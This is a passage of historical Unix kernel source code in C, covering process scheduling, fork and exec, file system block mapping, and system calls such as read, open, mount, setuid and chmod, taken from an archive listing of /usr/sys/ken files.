		if(rp >= &proc[NPROC])
			rp = &proc[0];
		if(rp->p_stat==SRUN && (rp->p_flag&SLOAD)!=0) {
			if(rp->p_pri < n) {
				p = rp;
				n = rp->p_pri;
			}
		}
	} while(--i);
	/*
	 * If no process is runnable, idle.
	 */
	if(p == NULL) {
		p = rp;
		idle();
		goto loop;
	}
	rp = p;
	curpri = n;
	/*
	 * Switch to stack of the new process and set up
	 * his segmentation registers.
	 */
	retu(rp->p_addr);
	sureg();
	/*
	 * If the new process paused because it was
	 * swapped out, set the stack level to the last call
	 * to savu(u_ssav).  This means that the return
	 * which is executed immediately after the call to aretu
	 * actually returns from the last routine which did
	 * the savu.
	 *
	 * You are not expected to understand this.
	 */
	if(rp->p_flag&SSWAP) {
		rp->p_flag =& ~SSWAP;
		aretu(u.u_ssav);
	}
	/*
	 * The value returned here has many subtle implications.
	 * See the newproc comments.
	 */
	return(1);
}

/*
 * Create a new process-- the internal version of
 * sys fork.
 * It returns 1 in the new process.
 * How this happens is rather hard to understand.
 * The essential fact is that the new process is created
 * in such a way that appears to have started executing
 * in the same call to newproc as the parent;
 * but in fact the code that runs is that of swtch.
 * The subtle implication of the returned value of swtch
 * (see above) is that this is the value that newproc's
 * caller in the new process sees.
 */
newproc()
{
	int a1, a2;
	struct proc *p, *up;
	register struct proc *rpp;
	register *rip, n;

	p = NULL;
	/*
	 * First, just locate a slot for a process
	 * and copy the useful info from this process into it.
	 * The panic "cannot happen" because fork has already
	 * checked for the existence of a slot.
	 */
retry:
	mpid++;
	if(mpid < 0) {
		mpid = 0;
		goto retry;
	}
	for(rpp = &proc[0]; rpp < &proc[NPROC]; rpp++) {
		if(rpp->p_stat == NULL && p==NULL)
			p = rpp;
		if (rpp->p_pid==mpid)
			goto retry;
	}
	if ((rpp = p)==NULL)
		panic("no procs");

	/*
	 * make proc entry for new proc
	 */

	rip = u.u_procp;
	up = rip;
	rpp->p_stat = SRUN;
	rpp->p_flag = SLOAD;
	rpp->p_uid = rip->p_uid;
	rpp->p_ttyp = rip->p_ttyp;
	rpp->p_nice = rip->p_nice;
	rpp->p_textp = rip->p_textp;
	rpp->p_pid = mpid;
	rpp->p_ppid = rip->p_pid;
	rpp->p_time = 0;

	/*
	 * make duplicate entries
	 * where needed
	 */

	for(rip = &u.u_ofile[0]; rip < &u.u_ofile[NOFILE];)
		if((rpp = *rip++) != NULL)
			rpp->f_count++;
	if((rpp=up->p_textp) != NULL) {
		rpp->x_count++;
		rpp->x_ccount++;
	}
	u.u_cdir->i_count++;
	/*
	 * Partially simulate the environment
	 * of the new process so that when it is actually
	 * created (by copying) it will look right.
	 */
	savu(u.u_rsav);
	rpp = p;
	u.u_procp = rpp;
	rip = up;
	n = rip->p_size;
	a1 = rip->p_addr;
	rpp->p_size = n;
	a2 = malloc(coremap, n);
	/*
	 * If there is not enough core for the
	 * new process, swap out the current process to generate the
	 * copy.
	 */
	if(a2 == NULL) {
		rip->p_stat = SIDL;
		rpp->p_addr = a1;
		savu(u.u_ssav);
		xswap(rpp, 0, 0);
		rpp->p_flag =| SSWAP;
		rip->p_stat = SRUN;
	} else {
	/*
	 * There is core, so just copy.
	 */
		rpp->p_addr = a2;
		while(n--)
			copyseg(a1++, a2++);
	}
	u.u_procp = rip;
	return(0);
}

/*
 * Change the size of the data+stack regions of the process.
 * If the size is shrinking, it's easy-- just release the extra core.
 * If it's growing, and there is core, just allocate it
 * and copy the image, taking care to reset registers to account
 * for the fact that the system's stack has moved.
 * If there is no core, arrange for the process to be swapped
 * out after adjusting the size requirement-- when it comes
 * in, enough core will be allocated.
 * Because of the ssave and SSWAP flags, control will
 * resume after the swap in swtch, which executes the return
 * from this stack level.
 *
 * After the expansion, the caller will take care of copying
 * the user's stack towards or away from the data area.
 */
expand(newsize)
{
	int i, n;
	register *p, a1, a2;

	p = u.u_procp;
	n = p->p_size;
	p->p_size = newsize;
	a1 = p->p_addr;
	if(n >= newsize) {
		mfree(coremap, n-newsize, a1+newsize);
		return;
	}
	savu(u.u_rsav);
	a2 = malloc(coremap, newsize);
	if(a2 == NULL) {
		savu(u.u_ssav);
		xswap(p, 1, n);
		p->p_flag =| SSWAP;
		swtch();
		/* no return */
	}
	p->p_addr = a2;
	for(i=0; i<n; i++)
		copyseg(a1+i, a2++);
	mfree(coremap, n, a1);
	retu(p->p_addr);
	sureg();
}
-- /usr/sys/ken/subr.c mode=0100664 uid=3 gid=3 atime=174921731 mtime=174843241 --
#
/*
 */

#include "../param.h"
#include "../conf.h"
#include "../inode.h"
#include "../user.h"
#include "../buf.h"
#include "../systm.h"

/*
 * Bmap defines the structure of file system storage
 * by returning the physical block number on a device given the
 * inode and the logical block number in a file.
 * When convenient, it also leaves the physical
 * block number of the next block of the file in rablock
 * for use in read-ahead.
 */
bmap(ip, bn)
struct inode *ip;
int bn;
{
	register *bp, *bap, nb;
	int *nbp, d, i;

	d = ip->i_dev;
	if(bn & ~077777) {
		u.u_error = EFBIG;
		return(0);
	}

	if((ip->i_mode&ILARG) == 0) {

		/*
		 * small file algorithm
		 */

		if((bn & ~7) != 0) {

			/*
			 * convert small to large
			 */

			if ((bp = alloc(d)) == NULL)
				return(NULL);
			bap = bp->b_addr;
			for(i=0; i<8; i++) {
				*bap++ = ip->i_addr[i];
				ip->i_addr[i] = 0;
			}
			ip->i_addr[0] = bp->b_blkno;
			bdwrite(bp);
			ip->i_mode =| ILARG;
			goto large;
		}
		nb = ip->i_addr[bn];
		if(nb == 0 && (bp = alloc(d)) != NULL) {
			bdwrite(bp);
			nb = bp->b_blkno;
			ip->i_addr[bn] = nb;
			ip->i_flag =| IUPD;
		}
		rablock = 0;
		if (bn<7)
			rablock = ip->i_addr[bn+1];
		return(nb);
	}

	/*
	 * large file algorithm
	 */

    large:
	i = bn>>8;
	if(bn & 0174000)
		i = 7;
	if((nb=ip->i_addr[i]) == 0) {
		ip->i_flag =| IUPD;
		if ((bp = alloc(d)) == NULL)
			return(NULL);
		ip->i_addr[i] = bp->b_blkno;
	} else
		bp = bread(d, nb);
	bap = bp->b_addr;

	/*
	 * "huge" fetch of double indirect block
	 */

	if(i == 7) {
		i = ((bn>>8) & 0377) - 7;
		if((nb=bap[i]) == 0) {
			if((nbp = alloc(d)) == NULL) {
				brelse(bp);
				return(NULL);
			}
			bap[i] = nbp->b_blkno;
			bdwrite(bp);
		} else {
			brelse(bp);
			nbp = bread(d, nb);
		}
		bp = nbp;
		bap = bp->b_addr;
	}

	/*
	 * normal indirect fetch
	 */

	i = bn & 0377;
	if((nb=bap[i]) == 0 && (nbp = alloc(d)) != NULL) {
		nb = nbp->b_blkno;
		bap[i] = nb;
		bdwrite(nbp);
		bdwrite(bp);
	} else
		brelse(bp);
	rablock = 0;
	if(i < 255)
		rablock = bap[i+1];
	return(nb);
}

/*
 * Pass back  c  to the user at his location u_base;
 * update u_base, u_count, and u_offset.  Return -1
 * on the last character of the user's read.
 * u_base is in the user address space unless u_segflg is set.
 */
passc(c)
char c;
{

	if(u.u_segflg)
		*u.u_base = c; else
		if(subyte(u.u_base, c) < 0) {
			u.u_error = EFAULT;
			return(-1);
		}
	u.u_count--;
	if(++u.u_offset[1] == 0)
		u.u_offset[0]++;
	u.u_base++;
	return(u.u_count == 0? -1: 0);
}

/*
 * Pick up and return the next character from the user's
 * write call at location u_base;
 * update u_base, u_count, and u_offset.  Return -1
 * when u_count is exhausted.  u_base is in the user's
 * address space unless u_segflg is set.
 */
cpass()
{
	register c;

	if(u.u_count == 0)
		return(-1);
	if(u.u_segflg)
		c = *u.u_base; else
		if((c=fubyte(u.u_base)) < 0) {
			u.u_error = EFAULT;
			return(-1);
		}
	u.u_count--;
	if(++u.u_offset[1] == 0)
		u.u_offset[0]++;
	u.u_base++;
	return(c&0377);
}

/*
 * Routine which sets a user error; placed in
 * illegal entries in the bdevsw and cdevsw tables.
 */
nodev()
{

	u.u_error = ENODEV;
}

/*
 * Null routine; placed in insignificant entries
 * in the bdevsw and cdevsw tables.
 */
nulldev()
{
}

/*
 * copy count words from from to to.
 */
bcopy(from, to, count)
int *from, *to;
{
	register *a, *b, c;

	a = from;
	b = to;
	c = count;
	do
		*b++ = *a++;
	while(--c);
}
-- /usr/sys/ken/sys1.c mode=0110664 uid=3 gid=3 atime=174921742 mtime=174907308 --
#
/*
 */

#include "../param.h"
#include "../systm.h"
#include "../user.h"
#include "../proc.h"
#include "../buf.h"
#include "../reg.h"
#include "../inode.h"

/*
 * exec system call.
 * Because of the fact that an I/O buffer is used
 * to store the caller's arguments during exec,
 * and more buffers are needed to read in the text file,
 * deadly embraces waiting for free buffers are possible.
 * Therefore the number of processes simultaneously
 * running in exec has to be limited to NEXEC.
 */
#define EXPRI	-1

exec()
{
	int ap, na, nc, *bp;
	int ts, ds, sep;
	register c, *ip;
	register char *cp;
	extern uchar;

	/*
	 * pick up file names
	 * and check various modes
	 * for execute permission
	 */

	ip = namei(&uchar, 0);
	if(ip == NULL)
		return;
	while(execnt >= NEXEC)
		sleep(&execnt, EXPRI);
	execnt++;
	bp = getblk(NODEV);
	if(access(ip, IEXEC) || (ip->i_mode&IFMT)!=0)
		goto bad;

	/*
	 * pack up arguments into
	 * allocated disk buffer
	 */

	cp = bp->b_addr;
	na = 0;
	nc = 0;
	while(ap = fuword(u.u_arg[1])) {
		na++;
		if(ap == -1)
			goto bad;
		u.u_arg[1] =+ 2;
		for(;;) {
			c = fubyte(ap++);
			if(c == -1)
				goto bad;
			*cp++ = c;
			nc++;
			if(nc > 510) {
				u.u_error = E2BIG;
				goto bad;
			}
			if(c == 0)
				break;
		}
	}
	if((nc&1) != 0) {
		*cp++ = 0;
		nc++;
	}

	/*
	 * read in first 8 bytes
	 * of file for segment
	 * sizes:
	 * w0 = 407/410/411 (410 implies RO text) (411 implies sep ID)
	 * w1 = text size
	 * w2 = data size
	 * w3 = bss size
	 */

	u.u_base = &u.u_arg[0];
	u.u_count = 8;
	u.u_offset[1] = 0;
	u.u_offset[0] = 0;
	u.u_segflg = 1;
	readi(ip);
	u.u_segflg = 0;
	if(u.u_error)
		goto bad;
	sep = 0;
	if(u.u_arg[0] == 0407) {
		u.u_arg[2] =+ u.u_arg[1];
		u.u_arg[1] = 0;
	} else
	if(u.u_arg[0] == 0411)
		sep++; else
	if(u.u_arg[0] != 0410) {
		u.u_error = ENOEXEC;
		goto bad;
	}
	if(u.u_arg[1]!=0 && (ip->i_flag&ITEXT)==0 && ip->i_count!=1) {
		u.u_error = ETXTBSY;
		goto bad;
	}

	/*
	 * find text and data sizes
	 * try them out for possible
	 * exceed of max sizes
	 */

	ts = ((u.u_arg[1]+63)>>6) & 01777;
	ds = ((u.u_arg[2]+u.u_arg[3]+63)>>6) & 01777;
	if(estabur(ts, ds, SSIZE, sep))
		goto bad;

	/*
	 * allocate and clear core
	 * at this point, committed
	 * to the new image
	 */

	u.u_prof[3] = 0;
	xfree();
	expand(USIZE);
	xalloc(ip);
	c = USIZE+ds+SSIZE;
	expand(c);
	while(--c >= USIZE)
		clearseg(u.u_procp->p_addr+c);

	/*
	 * read in data segment
	 */

	estabur(0, ds, 0, 0);
	u.u_base = 0;
	u.u_offset[1] = 020+u.u_arg[1];
	u.u_count = u.u_arg[2];
	readi(ip);

	/*
	 * initialize stack segment
	 */

	u.u_tsize = ts;
	u.u_dsize = ds;
	u.u_ssize = SSIZE;
	u.u_sep = sep;
	estabur(u.u_tsize, u.u_dsize, u.u_ssize, u.u_sep);
	cp = bp->b_addr;
	ap = -nc - na*2 - 4;
	u.u_ar0[R6] = ap;
	suword(ap, na);
	c = -nc;
	while(na--) {
		suword(ap=+2, c);
		do
			subyte(c++, *cp);
		while(*cp++);
	}
	suword(ap+2, -1);

	/*
	 * set SUID/SGID protections, if no tracing
	 */

	if ((u.u_procp->p_flag&STRC)==0) {
		if(ip->i_mode&ISUID)
			if(u.u_uid != 0) {
				u.u_uid = ip->i_uid;
				u.u_procp->p_uid = ip->i_uid;
			}
		if(ip->i_mode&ISGID)
			u.u_gid = ip->i_gid;
	}

	/*
	 * clear sigs, regs and return
	 */

	c = ip;
	for(ip = &u.u_signal[0]; ip < &u.u_signal[NSIG]; ip++)
		if((*ip & 1) == 0)
			*ip = 0;
	for(cp = &regloc[0]; cp < &regloc[6];)
		u.u_ar0[*cp++] = 0;
	u.u_ar0[R7] = 0;
	for(ip = &u.u_fsav[0]; ip < &u.u_fsav[25];)
		*ip++ = 0;
	ip = c;

bad:
	iput(ip);
	brelse(bp);
	if(execnt >= NEXEC)
		wakeup(&execnt);
	execnt--;
}

/*
 * exit system call:
 * pass back caller's r0
 */
rexit()
{

	u.u_arg[0] = u.u_ar0[R0] << 8;
	exit();
}

/*
 * Release resources.
 * Save u. area for parent to look at.
 * Enter zombie state.
 * Wake up parent and init processes,
 * and dispose of children.
 */
exit()
{
	register int *q, a;
	register struct proc *p;

	u.u_procp->p_flag =& ~STRC;
	for(q = &u.u_signal[0]; q < &u.u_signal[NSIG];)
		*q++ = 1;
	for(q = &u.u_ofile[0]; q < &u.u_ofile[NOFILE]; q++)
		if(a = *q) {
			*q = NULL;
			closef(a);
		}
	iput(u.u_cdir);
	xfree();
	a = malloc(swapmap, 1);
	if(a == NULL)
		panic("out of swap");
	p = getblk(swapdev, a);
	bcopy(&u, p->b_addr, 256);
	bwrite(p);
	q = u.u_procp;
	mfree(coremap, q->p_size, q->p_addr);
	q->p_addr = a;
	q->p_stat = SZOMB;

loop:
	for(p = &proc[0]; p < &proc[NPROC]; p++)
	if(q->p_ppid == p->p_pid) {
		wakeup(&proc[1]);
		wakeup(p);
		for(p = &proc[0]; p < &proc[NPROC]; p++)
		if(q->p_pid == p->p_ppid) {
			p->p_ppid  = 1;
			if (p->p_stat == SSTOP)
				setrun(p);
		}
		swtch();
		/* no return */
	}
	q->p_ppid = 1;
	goto loop;
}

/*
 * Wait system call.
 * Search for a terminated (zombie) child,
 * finally lay it to rest, and collect its status.
 * Look also for stopped (traced) children,
 * and pass back status from them.
 */
wait()
{
	register f, *bp;
	register struct proc *p;

	f = 0;

loop:
	for(p = &proc[0]; p < &proc[NPROC]; p++)
	if(p->p_ppid == u.u_procp->p_pid) {
		f++;
		if(p->p_stat == SZOMB) {
			u.u_ar0[R0] = p->p_pid;
			bp = bread(swapdev, f=p->p_addr);
			mfree(swapmap, 1, f);
			p->p_stat = NULL;
			p->p_pid = 0;
			p->p_ppid = 0;
			p->p_sig = 0;
			p->p_ttyp = 0;
			p->p_flag = 0;
			p = bp->b_addr;
			u.u_cstime[0] =+ p->u_cstime[0];
			dpadd(u.u_cstime, p->u_cstime[1]);
			dpadd(u.u_cstime, p->u_stime);
			u.u_cutime[0] =+ p->u_cutime[0];
			dpadd(u.u_cutime, p->u_cutime[1]);
			dpadd(u.u_cutime, p->u_utime);
			u.u_ar0[R1] = p->u_arg[0];
			brelse(bp);
			return;
		}
		if(p->p_stat == SSTOP) {
			if((p->p_flag&SWTED) == 0) {
				p->p_flag =| SWTED;
				u.u_ar0[R0] = p->p_pid;
				u.u_ar0[R1] = (p->p_sig<<8) | 0177;
				return;
			}
			p->p_flag =& ~(STRC|SWTED);
			setrun(p);
		}
	}
	if(f) {
		sleep(u.u_procp, PWAIT);
		goto loop;
	}
	u.u_error = ECHILD;
}

/*
 * fork system call.
 */
fork()
{
	register struct proc *p1, *p2;

	p1 = u.u_procp;
	for(p2 = &proc[0]; p2 < &proc[NPROC]; p2++)
		if(p2->p_stat == NULL)
			goto found;
	u.u_error = EAGAIN;
	goto out;

found:
	if(newproc()) {
		u.u_ar0[R0] = p1->p_pid;
		u.u_cstime[0] = 0;
		u.u_cstime[1] = 0;
		u.u_stime = 0;
		u.u_cutime[0] = 0;
		u.u_cutime[1] = 0;
		u.u_utime = 0;
		return;
	}
	u.u_ar0[R0] = p2->p_pid;

out:
	u.u_ar0[R7] =+ 2;
}

/*
 * break system call.
 *  -- bad planning: "break" is a dirty word in C.
 */
sbreak()
{
	register a, n, d;
	int i;

	/*
	 * set n to new data size
	 * set d to new-old
	 * set n to new total size
	 */

	n = (((u.u_arg[0]+63)>>6) & 01777);
	if(!u.u_sep)
		n =- nseg(u.u_tsize) * 128;
	if(n < 0)
		n = 0;
	d = n - u.u_dsize;
	n =+ USIZE+u.u_ssize;
	if(estabur(u.u_tsize, u.u_dsize+d, u.u_ssize, u.u_sep))
		return;
	u.u_dsize =+ d;
	if(d > 0)
		goto bigger;
	a = u.u_procp->p_addr + n - u.u_ssize;
	i = n;
	n = u.u_ssize;
	while(n--) {
		copyseg(a-d, a);
		a++;
	}
	expand(i);
	return;

bigger:
	expand(n);
	a = u.u_procp->p_addr + n;
	n = u.u_ssize;
	while(n--) {
		a--;
		copyseg(a-d, a);
	}
	while(d--)
		clearseg(--a);
}
-- /usr/sys/ken/sys2.c mode=0110664 uid=3 gid=3 atime=174921757 mtime=174907342 --
#
#include "../param.h"
#include "../systm.h"
#include "../user.h"
#include "../reg.h"
#include "../file.h"
#include "../inode.h"

/*
 * read system call
 */
read()
{
	rdwr(FREAD);
}

/*
 * write system call
 */
write()
{
	rdwr(FWRITE);
}

/*
 * common code for read and write calls:
 * check permissions, set base, count, and offset,
 * and switch out to readi, writei, or pipe code.
 */
rdwr(mode)
{
	register *fp, m;

	m = mode;
	fp = getf(u.u_ar0[R0]);
	if(fp == NULL)
		return;
	if((fp->f_flag&m) == 0) {
		u.u_error = EBADF;
		return;
	}
	u.u_base = u.u_arg[0];
	u.u_count = u.u_arg[1];
	u.u_segflg = 0;
	if(fp->f_flag&FPIPE) {
		if(m==FREAD)
			readp(fp); else
			writep(fp);
	} else {
		u.u_offset[1] = fp->f_offset[1];
		u.u_offset[0] = fp->f_offset[0];
		if(m==FREAD)
			readi(fp->f_inode); else
			writei(fp->f_inode);
		dpadd(fp->f_offset, u.u_arg[1]-u.u_count);
	}
	u.u_ar0[R0] = u.u_arg[1]-u.u_count;
}

/*
 * open system call
 */
open()
{
	register *ip;
	extern uchar;

	ip = namei(&uchar, 0);
	if(ip == NULL)
		return;
	u.u_arg[1]++;
	open1(ip, u.u_arg[1], 0);
}

/*
 * creat system call
 */
creat()
{
	register *ip;
	extern uchar;

	ip = namei(&uchar, 1);
	if(ip == NULL) {
		if(u.u_error)
			return;
		ip = maknode(u.u_arg[1]&07777&(~ISVTX));
		if (ip==NULL)
			return;
		open1(ip, FWRITE, 2);
	} else
		open1(ip, FWRITE, 1);
}

/*
 * common code for open and creat.
 * Check permissions, allocate an open file structure,
 * and call the device open routine if any.
 */
open1(ip, mode, trf)
int *ip;
{
	register struct file *fp;
	register *rip, m;
	int i;

	rip = ip;
	m = mode;
	if(trf != 2) {
		if(m&FREAD)
			access(rip, IREAD);
		if(m&FWRITE) {
			access(rip, IWRITE);
			if((rip->i_mode&IFMT) == IFDIR)
				u.u_error = EISDIR;
		}
	}
	if(u.u_error)
		goto out;
	if(trf)
		itrunc(rip);
	prele(rip);
	if ((fp = falloc()) == NULL)
		goto out;
	fp->f_flag = m&(FREAD|FWRITE);
	fp->f_inode = rip;
	i = u.u_ar0[R0];
	openi(rip, m&FWRITE);
	if(u.u_error == 0)
		return;
	u.u_ofile[i] = NULL;
	fp->f_count--;

out:
	iput(rip);
}

/*
 * close system call
 */
close()
{
	register *fp;

	fp = getf(u.u_ar0[R0]);
	if(fp == NULL)
		return;
	u.u_ofile[u.u_ar0[R0]] = NULL;
	closef(fp);
}

/*
 * seek system call
 */
seek()
{
	int n[2];
	register *fp, t;

	fp = getf(u.u_ar0[R0]);
	if(fp == NULL)
		return;
	if(fp->f_flag&FPIPE) {
		u.u_error = ESPIPE;
		return;
	}
	t = u.u_arg[1];
	if(t > 2) {
		n[1] = u.u_arg[0]<<9;
		n[0] = u.u_arg[0]>>7;
		if(t == 3)
			n[0] =& 0777;
	} else {
		n[1] = u.u_arg[0];
		n[0] = 0;
		if(t!=0 && n[1]<0)
			n[0] = -1;
	}
	switch(t) {

	case 1:
	case 4:
		n[0] =+ fp->f_offset[0];
		dpadd(n, fp->f_offset[1]);
		break;

	default:
		n[0] =+ fp->f_inode->i_size0&0377;
		dpadd(n, fp->f_inode->i_size1);

	case 0:
	case 3:
		;
	}
	fp->f_offset[1] = n[1];
	fp->f_offset[0] = n[0];
}

/*
 * link system call
 */
link()
{
	register *ip, *xp;
	extern uchar;

	ip = namei(&uchar, 0);
	if(ip == NULL)
		return;
	if(ip->i_nlink >= 127) {
		u.u_error = EMLINK;
		goto out;
	}
	if((ip->i_mode&IFMT)==IFDIR && !suser())
		goto out;
	/*
	 * unlock to avoid possibly hanging the namei
	 */
	ip->i_flag =& ~ILOCK;
	u.u_dirp = u.u_arg[1];
	xp = namei(&uchar, 1);
	if(xp != NULL) {
		u.u_error = EEXIST;
		iput(xp);
	}
	if(u.u_error)
		goto out;
	if(u.u_pdir->i_dev != ip->i_dev) {
		iput(u.u_pdir);
		u.u_error = EXDEV;
		goto out;
	}
	wdir(ip);
	ip->i_nlink++;
	ip->i_flag =| IUPD;

out:
	iput(ip);
}

/*
 * mknod system call
 */
mknod()
{
	register *ip;
	extern uchar;

	if(suser()) {
		ip = namei(&uchar, 1);
		if(ip != NULL) {
			u.u_error = EEXIST;
			goto out;
		}
	}
	if(u.u_error)
		return;
	ip = maknode(u.u_arg[1]);
	if (ip==NULL)
		return;
	ip->i_addr[0] = u.u_arg[2];

out:
	iput(ip);
}

/*
 * sleep system call
 * not to be confused with the sleep internal routine.
 */
sslep()
{
	char *d[2];

	spl7();
	d[0] = time[0];
	d[1] = time[1];
	dpadd(d, u.u_ar0[R0]);

	while(dpcmp(d[0], d[1], time[0], time[1]) > 0) {
		if(dpcmp(tout[0], tout[1], time[0], time[1]) <= 0 ||
		   dpcmp(tout[0], tout[1], d[0], d[1]) > 0) {
			tout[0] = d[0];
			tout[1] = d[1];
		}
		sleep(tout, PSLEP);
	}
	spl0();
}
-- /usr/sys/ken/sys3.c mode=0100664 uid=3 gid=3 atime=174921769 mtime=174843259 --
#
/*
 */

#include "../param.h"
#include "../systm.h"
#include "../reg.h"
#include "../buf.h"
#include "../filsys.h"
#include "../user.h"
#include "../inode.h"
#include "../file.h"
#include "../conf.h"

/*
 * the fstat system call.
 */
fstat()
{
	register *fp;

	fp = getf(u.u_ar0[R0]);
	if(fp == NULL)
		return;
	stat1(fp->f_inode, u.u_arg[0]);
}

/*
 * the stat system call.
 */
stat()
{
	register ip;
	extern uchar;

	ip = namei(&uchar, 0);
	if(ip == NULL)
		return;
	stat1(ip, u.u_arg[1]);
	iput(ip);
}

/*
 * The basic routine for fstat and stat:
 * get the inode and pass appropriate parts back.
 */
stat1(ip, ub)
int *ip;
{
	register i, *bp, *cp;

	iupdat(ip, time);
	bp = bread(ip->i_dev, ldiv(ip->i_number+31, 16));
	cp = bp->b_addr + 32*lrem(ip->i_number+31, 16) + 24;
	ip = &(ip->i_dev);
	for(i=0; i<14; i++) {
		suword(ub, *ip++);
		ub =+ 2;
	}
	for(i=0; i<4; i++) {
		suword(ub, *cp++);
		ub =+ 2;
	}
	brelse(bp);
}

/*
 * the dup system call.
 */
dup()
{
	register i, *fp;

	fp = getf(u.u_ar0[R0]);
	if(fp == NULL)
		return;
	if ((i = ufalloc()) < 0)
		return;
	u.u_ofile[i] = fp;
	fp->f_count++;
}

/*
 * the mount system call.
 */
smount()
{
	int d;
	register *ip;
	register struct mount *mp, *smp;
	extern uchar;

	d = getmdev();
	if(u.u_error)
		return;
	u.u_dirp = u.u_arg[1];
	ip = namei(&uchar, 0);
	if(ip == NULL)
		return;
	if(ip->i_count!=1 || (ip->i_mode&(IFBLK&IFCHR))!=0)
		goto out;
	smp = NULL;
	for(mp = &mount[0]; mp < &mount[NMOUNT]; mp++) {
		if(mp->m_bufp != NULL) {
			if(d == mp->m_dev)
				goto out;
		} else
		if(smp == NULL)
			smp = mp;
	}
	if(smp == NULL)
		goto out;
	(*bdevsw[d.d_major].d_open)(d, !u.u_arg[2]);
	if(u.u_error)
		goto out;
	mp = bread(d, 1);
	if(u.u_error) {
		brelse(mp);
		goto out1;
	}
	smp->m_inodp = ip;
	smp->m_dev = d;
	smp->m_bufp = getblk(NODEV);
	bcopy(mp->b_addr, smp->m_bufp->b_addr, 256);
	smp = smp->m_bufp->b_addr;
	smp->s_ilock = 0;
	smp->s_flock = 0;
	smp->s_ronly = u.u_arg[2] & 1;
	brelse(mp);
	ip->i_flag =| IMOUNT;
	prele(ip);
	return;

out:
	u.u_error = EBUSY;
out1:
	iput(ip);
}

/*
 * the umount system call.
 */
sumount()
{
	int d;
	register struct inode *ip;
	register struct mount *mp;

	update();
	d = getmdev();
	if(u.u_error)
		return;
	for(mp = &mount[0]; mp < &mount[NMOUNT]; mp++)
		if(mp->m_bufp!=NULL && d==mp->m_dev)
			goto found;
	u.u_error = EINVAL;
	return;

found:
	for(ip = &inode[0]; ip < &inode[NINODE]; ip++)
		if(ip->i_number!=0 && d==ip->i_dev) {
			u.u_error = EBUSY;
			return;
		}
	(*bdevsw[d.d_major].d_close)(d, 0);
	ip = mp->m_inodp;
	ip->i_flag =& ~IMOUNT;
	iput(ip);
	ip = mp->m_bufp;
	mp->m_bufp = NULL;
	brelse(ip);
}

/*
 * Common code for mount and umount.
 * Check that the user's argument is a reasonable
 * thing on which to mount, and return the device number if so.
 */
getmdev()
{
	register d, *ip;
	extern uchar;

	ip = namei(&uchar, 0);
	if(ip == NULL)
		return;
	if((ip->i_mode&IFMT) != IFBLK)
		u.u_error = ENOTBLK;
	d = ip->i_addr[0];
	if(ip->i_addr[0].d_major >= nblkdev)
		u.u_error = ENXIO;
	iput(ip);
	return(d);
}
-- /usr/sys/ken/sys4.c mode=0100664 uid=3 gid=3 atime=174921779 mtime=174907526 --
#
/*
 */

/*
 * Everything in this file is a routine implementing a system call.
 */

#include "../param.h"
#include "../user.h"
#include "../reg.h"
#include "../inode.h"
#include "../systm.h"
#include "../proc.h"

getswit()
{

	u.u_ar0[R0] = SW->integ;
}

gtime()
{

	u.u_ar0[R0] = time[0];
	u.u_ar0[R1] = time[1];
}

stime()
{

	if(suser()) {
		time[0] = u.u_ar0[R0];
		time[1] = u.u_ar0[R1];
		wakeup(tout);
	}
}

setuid()
{
	register uid;

	uid = u.u_ar0[R0].lobyte;
	if(u.u_ruid == uid.lobyte || suser()) {
		u.u_uid = uid;
		u.u_procp->p_uid = uid;
		u.u_ruid = uid;
	}
}

getuid()
{

	u.u_ar0[R0].lobyte = u.u_ruid;
	u.u_ar0[R0].hibyte = u.u_uid;
}

setgid()
{
	register gid;

	gid = u.u_ar0[R0].lobyte;
	if(u.u_rgid == gid.lobyte || suser()) {
		u.u_gid = gid;
		u.u_rgid = gid;
	}
}

getgid()
{

	u.u_ar0[R0].lobyte = u.u_rgid;
	u.u_ar0[R0].hibyte = u.u_gid;
}

getpid()
{
	u.u_ar0[R0] = u.u_procp->p_pid;
}

sync()
{

	update();
}

nice()
{
	register n;

	n = u.u_ar0[R0];
	if(n > 20)
		n = 20;
	if(n < 0 && !suser())
		n = 0;
	u.u_procp->p_nice = n;
}

/*
 * Unlink system call.
 * panic: unlink -- "cannot happen"
 */
unlink()
{
	register *ip, *pp;
	extern uchar;

	pp = namei(&uchar, 2);
	if(pp == NULL)
		return;
	prele(pp);
	ip = iget(pp->i_dev, u.u_dent.u_ino);
	if(ip == NULL)
		panic("unlink -- iget");
	if((ip->i_mode&IFMT)==IFDIR && !suser())
		goto out;
	u.u_offset[1] =- DIRSIZ+2;
	u.u_base = &u.u_dent;
	u.u_count = DIRSIZ+2;
	u.u_dent.u_ino = 0;
	writei(pp);
	ip->i_nlink--;
	ip->i_flag =| IUPD;

out:
	iput(pp);
	iput(ip);
}

chdir()
{
	register *ip;
	extern uchar;

	ip = namei(&uchar, 0);
	if(ip == NULL)
		return;
	if((ip->i_mode&IFMT) != IFDIR) {
		u.u_error = ENOTDIR;
	bad:
		iput(ip);
		return;
	}
	if(access(ip, IEXEC))
		goto bad;
	iput(u.u_cdir);
	u.u_cdir = ip;
	prele(ip);
}

chmod()
{
	register *ip;

	if ((ip = owner()) == NULL)
		return;
	ip->i_mode =& ~07777;
	if (u.u_uid)
		u.u_arg[1] =& ~ISVTX;
	ip->i_mode =| u.u_arg[1]&07777;
	ip->i_flag =| IUPD;
	iput(ip);
}

chown()
{
	register *ip;

	if (!suser() || (ip = owner()) == NULL)
		return;
	ip->i_uid = u.u_arg[1].lobyte;
	ip->i_gid = u.u_arg[1].hibyte;
	ip->i_flag =| IUPD;
	iput(ip);
}

/*
 * Change modified date of file:
 * time to r0-r1; sys smdate; file
 * This call has been withdrawn because it messes up
 * incremental dumps (pseudo-old files aren't dumped).
 * It works though and you can uncomment it if you like.

smdate()
{
	register struct inode *ip;
	register int *tp;
	int tbuf[2];

	if ((ip = owner()) == NULL)
		return;
	ip->i_flag =| IUPD;
	tp = &tbuf[2];
	*--tp = u.u_ar0[R1];
	*--tp = u.u_ar0[R0];
	iupdat(ip, tp);
	ip->i_flag =& ~IUPD;
	iput(ip);
}
*/

ssig()
{
	register a;

	a = u.u_arg[0];
	if(a<=0 || a>=NSIG || a ==SIGKIL) {
		u.u_error = EINVAL;
		return;
	}
	u.u_ar0[R0] = u.u_signal[a];
	u.u_signal[a] = u.u_arg[1];
	if(u.u_procp->p_sig == a)
		u.u_procp->p_sig = 0;
}

kill()
{
	register struct proc *p, *q;
	register a;
	int f;

	f = 0;
	a = u.u_ar0[R0];
	q = u.u_procp;
	for(p = &proc[0]; p < &proc[NPROC]; p++) {
		if(p == q)
			continue;
		if(a != 0 && p->p_pid != a)
			continue;
		if(a == 0 && (p->p_ttyp != q->p_ttyp || p <= &proc[1]))
			continue;
